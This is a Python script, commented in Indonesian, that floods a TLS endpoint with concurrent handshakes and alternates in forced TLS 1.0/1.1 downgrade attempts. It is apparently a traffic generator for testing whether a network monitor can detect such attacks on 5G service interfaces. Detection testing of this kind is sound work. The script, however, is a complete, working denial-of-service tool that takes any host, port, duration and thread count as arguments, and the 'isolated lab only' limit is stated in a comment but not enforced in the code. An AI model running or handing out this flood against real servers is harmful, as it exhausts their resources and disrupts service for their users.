#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Tier 5 (T5-05) — tls_handshake_flood.
Membanjiri endpoint SBI (TLS) dengan handshake berulang + percobaan DOWNGRADE
(memaksa TLS 1.0/1.1 ke server yang hanya mau TLS 1.3) sehingga banyak handshake
GAGAL. Tujuannya menghasilkan trafik TLS terenkripsi (ClientHello, Alert) yang
harus dideteksi NFM hanya dari metadata/handshake/timing — bukan isi payload.

Model ancaman: TLS renegotiation/handshake DoS + downgrade probing (3GPP TS
33.501 mewajibkan TLS di SBI; penyerang menekan NF lewat cost handshake).

  python3 tls_flood.py <host> <port> <duration_s> [concurrency]

Hanya untuk LAB TERISOLASI. run_scenario.sh menjaga target tetap di subnet lab.
"""
import socket, ssl, sys, time, threading

def worker(host, port, stop_at, counters, mix):
    while time.time() < stop_at:
        # Selang-seling: handshake normal (TLS1.2+) dan percobaan downgrade (TLS1.0/1.1).
        downgrade = (counters["n"] % 2 == 0) if mix else False
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        try:
            if downgrade:
                # Paksa hanya TLS 1.0/1.1 → ditolak server modern = handshake gagal.
                ctx.minimum_version = ssl.TLSVersion.TLSv1
                ctx.maximum_version = ssl.TLSVersion.TLSv1_1
                try: ctx.set_ciphers("ALL:@SECLEVEL=0")
                except ssl.SSLError: pass
        except (ValueError, ssl.SSLError):
            pass
        try:
            raw = socket.create_connection((host, port), timeout=3)
            s = ctx.wrap_socket(raw, server_hostname=host)
            s.close()
            counters["ok"] += 1
        except Exception:
            counters["fail"] += 1   # handshake gagal (termasuk downgrade ditolak)
        finally:
            counters["n"] += 1

def main():
    if len(sys.argv) < 4:
        print("pakai: tls_flood.py <host> <port> <duration_s> [concurrency]"); sys.exit(2)
    host = sys.argv[1]; port = int(sys.argv[2]); dur = int(sys.argv[3])
    conc = int(sys.argv[4]) if len(sys.argv) > 4 else 20
    print(f"[tls_flood] {host}:{port} selama {dur}s, {conc} worker (normal + downgrade).")
    counters = {"n": 0, "ok": 0, "fail": 0}
    stop_at = time.time() + dur
    ts = [threading.Thread(target=worker, args=(host, port, stop_at, counters, True),
                           daemon=True) for _ in range(conc)]
    for t in ts: t.start()
    for t in ts: t.join()
    print(f"[tls_flood] selesai: {counters['n']} handshake "
          f"({counters['ok']} ok, {counters['fail']} gagal/downgrade-ditolak).")

if __name__ == "__main__":
    main()
